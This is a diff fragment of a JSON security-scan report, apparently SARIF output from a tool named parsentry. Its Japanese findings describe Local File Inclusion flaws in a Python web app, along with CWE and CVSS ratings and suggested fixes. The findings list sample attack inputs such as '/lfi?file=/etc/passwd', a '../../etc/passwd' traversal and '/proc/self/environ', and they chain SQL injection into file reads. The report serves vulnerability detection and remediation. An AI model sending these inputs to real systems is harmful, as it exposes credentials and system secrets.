+            "text": "LFI: ### Local File Inclusion (LFI) 脆弱性\n\n**概要**: `/lfi` エンドポイントで、ユーザーが提供するファイルパスが検証なしに `open()` 関数に渡されている。\n\n**流れ**:\n1. **Principal**: `request.args.get(\"file\", \"\")` からユーザー入力を取得\n2. **Resource**: `open(file_path, 'r')` でファイルをオープンして読み込み\n3. **Action**: 入力値に対する検証がない\n   - パストラバーサル対策がない\n   - ホワイトリスト制限がない\n   - ファイルシステムアクセス制限がない\n\n**攻撃シナリオ**:\n- `/lfi?file=/etc/passwd` → システムパスワードファイル読み込み\n- `/lfi?file=/etc/hosts` → ネットワーク設定ファイル読み込み\n- `/lfi?file=../../etc/passwd` → パストラバーサルによるディレクトリ階層外のファイル読み込み\n- `/lfi?file=/proc/self/environ` → 環境変数の読み込み\n\n**影響**: \n- 機密情報の開示（設定ファイル、秘密鍵、パスワード等）\n- システム情報の漏洩\n- 他の攻撃へのステップストーン\n\n**CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-73 (External Control of File Name or Path)\n\n**CVSS**: 7.5 (High) - Confidentiality Impact: High\n",
+            "markdown": "### Local File Inclusion (LFI) 脆弱性\n\n**概要**: `/lfi` エンドポイントで、ユーザーが提供するファイルパスが検証なしに `open()` 関数に渡されている。\n\n**流れ**:\n1. **Principal**: `request.args.get(\"file\", \"\")` からユーザー入力を取得\n2. **Resource**: `open(file_path, 'r')` でファイルをオープンして読み込み\n3. **Action**: 入力値に対する検証がない\n   - パストラバーサル対策がない\n   - ホワイトリスト制限がない\n   - ファイルシステムアクセス制限がない\n\n**攻撃シナリオ**:\n- `/lfi?file=/etc/passwd` → システムパスワードファイル読み込み\n- `/lfi?file=/etc/hosts` → ネットワーク設定ファイル読み込み\n- `/lfi?file=../../etc/passwd` → パストラバーサルによるディレクトリ階層外のファイル読み込み\n- `/lfi?file=/proc/self/environ` → 環境変数の読み込み\n\n**影響**: \n- 機密情報の開示（設定ファイル、秘密鍵、パスワード等）\n- システム情報の漏洩\n- 他の攻撃へのステップストーン\n\n**CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-73 (External Control of File Name or Path)\n\n**CVSS**: 7.5 (High) - Confidentiality Impact: High\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/app.py",
                   "index": 17
                 }
               }
             }
           ],
           "fingerprints": {
-            "parsentry/v1": "a1b2200d60783f7e"
+            "parsentry/v1": "213834fb25c6822"
           },
           "properties": {
             "confidence": 0.9,
@@ -759,21 +759,21 @@
           "ruleIndex": 2,
           "level": "error",
           "message": {
-            "text": "LFI: ### Local File Inclusion (LFI) 脆弱性\n\n**概要**: `/lfi` エンドポイントで、ユーザーが提供するファイルパスが検証なしに `open()` 関数に渡されている。\n\n**流れ**:\n1. **Principal**: `request.args.get(\"file\", \"\")` からユーザー入力を取得\n2. **Resource**: `open(file_path, 'r')` でファイルをオープンして読み込み\n3. **Action**: 入力値に対する検証がない\n   - パストラバーサル対策がない\n   - ホワイトリスト制限がない\n   - ファイルシステムアクセス制限がない\n\n**攻撃シナリオ**:\n- `/lfi?file=/etc/passwd` → システムパスワードファイル読み込み\n- `/lfi?file=/etc/hosts` → ネットワーク設定ファイル読み込み\n- `/lfi?file=../../etc/passwd` → パストラバーサルによるディレクトリ階層外のファイル読み込み\n- `/lfi?file=/proc/self/environ` → 環境変数の読み込み\n\n**影響**: \n- 機密情報の開示（設定ファイル、秘密鍵、パスワード等）\n- システム情報の漏洩\n- 他の攻撃へのステップストーン\n\n**CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-73 (External Control of File Name or Path)\n\n**CVSS**: 7.5 (High) - Confidentiality Impact: High\n",
-            "markdown": "### Local File Inclusion (LFI) 脆弱性\n\n**概要**: `/lfi` エンドポイントで、ユーザーが提供するファイルパスが検証なしに `open()` 関数に渡されている。\n\n**流れ**:\n1. **Principal**: `request.args.get(\"file\", \"\")` からユーザー入力を取得\n2. **Resource**: `open(file_path, 'r')` でファイルをオープンして読み込み\n3. **Action**: 入力値に対する検証がない\n   - パストラバーサル対策がない\n   - ホワイトリスト制限がない\n   - ファイルシステムアクセス制限がない\n\n**攻撃シナリオ**:\n- `/lfi?file=/etc/passwd` → システムパスワードファイル読み込み\n- `/lfi?file=/etc/hosts` → ネットワーク設定ファイル読み込み\n- `/lfi?file=../../etc/passwd` → パストラバーサルによるディレクトリ階層外のファイル読み込み\n- `/lfi?file=/proc/self/environ` → 環境変数の読み込み\n\n**影響**: \n- 機密情報の開示（設定ファイル、秘密鍵、パスワード等）\n- システム情報の漏洩\n- 他の攻撃へのステップストーン\n\n**CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-73 (External Control of File Name or Path)\n\n**CVSS**: 7.5 (High) - Confidentiality Impact: High\n"
+            "text": "LFI: ## Local File Inclusion (LFI) 脆弱性\n\n### 位置\nモデルファイルの`get_document_content`メソッド（195行目）\n\n### 脆弱性の詳細\nデータベースから取得したファイルパスに対する検証が行われずに`open()`関数で直接使用されています。\n\n```python\nwith open(file_path, 'r') as f:  # 211行目\n    return f.read()\n```\n\n### PAR分析\n**Principal**: ユーザー入力の`doc_id`（信頼できない）\n**Action**: セキュリティ制御なし。入力値に対するバリデーションや正規化がない\n**Resource**: ファイルシステム（`open()`操作）\n\n### 攻撃ベクトル\n1. SQLインジェクション（200行目）でデータベースクエリを改竄\n2. 任意のファイルパスをレスポンスとして返させる\n3. サーバー上の任意のファイル（/etc/passwd等）を読み込み可能\n\n### 影響\n- システムファイルの読取\n- 認証情報やAPIキーの露出\n- 機密情報の漏洩\n\n### 推奨される修正\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. ファイルパスのホワイトリスト検証\n3. ディレクトリトラバーサル対策（os.path.realpath()で正規化し、許可ディレクトリ内であることを確認）",
+            "markdown": "## Local File Inclusion (LFI) 脆弱性\n\n### 位置\nモデルファイルの`get_document_content`メソッド（195行目）\n\n### 脆弱性の詳細\nデータベースから取得したファイルパスに対する検証が行われずに`open()`関数で直接使用されています。\n\n```python\nwith open(file_path, 'r') as f:  # 211行目\n    return f.read()\n```\n\n### PAR分析\n**Principal**: ユーザー入力の`doc_id`（信頼できない）\n**Action**: セキュリティ制御なし。入力値に対するバリデーションや正規化がない\n**Resource**: ファイルシステム（`open()`操作）\n\n### 攻撃ベクトル\n1. SQLインジェクション（200行目）でデータベースクエリを改竄\n2. 任意のファイルパスをレスポンスとして返させる\n3. サーバー上の任意のファイル（/etc/passwd等）を読み込み可能\n\n### 影響\n- システムファイルの読取\n- 認証情報やAPIキーの露出\n- 機密情報の漏洩\n\n### 推奨される修正\n1. パラメータ化クエリ（プリペアドステートメント）を使用\n2. ファイルパスのホワイトリスト検証\n3. ディレクトリトラバーサル対策（os.path.realpath()で正規化し、許可ディレクトリ内であることを確認）"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "repo/app.py",
+                  "uri": "repo/models.py",
                   "index": 19
                 }
               }
             }
           ],
           "fingerprints": {
-            "parsentry/v1": "213834fb25c6822"
+            "parsentry/v1": "a1b2200d60783f7e"
           },
           "properties": {
             "confidence": 0.9,
@@ -793,14 +793,14 @@
       "artifacts": [
         {
           "location": {
-            "uri": "repo/models.py",
+            "uri": "repo/app.py",
             "index": 0
           },
           "mime_type": "text/x-python"
         },
         {
           "location": {
-            "uri": "repo/models.py",
+            "uri": "repo/app.py",
             "index": 1
           },
           "mime_type": "text/x-python"
@@ -877,42 +877,42 @@
         },
         {
           "location": {
-            "uri": "repo/api.py",
+            "uri": "repo/models.py",
             "index": 12
           },
           "mime_type": "text/x-python"
         },
         {
           "location": {
-            "uri": "repo/app.py",
+            "uri": "repo/models.py",
             "index": 13
           },
           "mime_type": "text/x-python"
         },
         {
           "location": {
-            "uri": "repo/app.py",
+            "uri": "repo/api.py",
             "index": 14
           },
           "mime_type": "text/x-python"
         },
         {
           "location": {
-            "uri": "repo/api.py",
+            "uri": "repo/app.py",
             "index": 15
           },
           "mime_type": "text/x-python"
         },
         {
           "location": {
-            "uri": "repo/app.py",
+            "uri": "repo/api.py",
             "index": 16
           },
           "mime_type": "text/x-python"
         },
         {
           "location": {
-            "uri": "repo/models.py",
+            "uri": "repo/app.py",
             "index": 17
           },
           "mime_type": "text/x-python"
@@ -926,7 +926,7 @@
         },
         {
           "location": {
-            "uri": "repo/app.py",
+            "uri": "repo/models.py",
             "index": 19
           },
           "mime_type": "text/x-python"
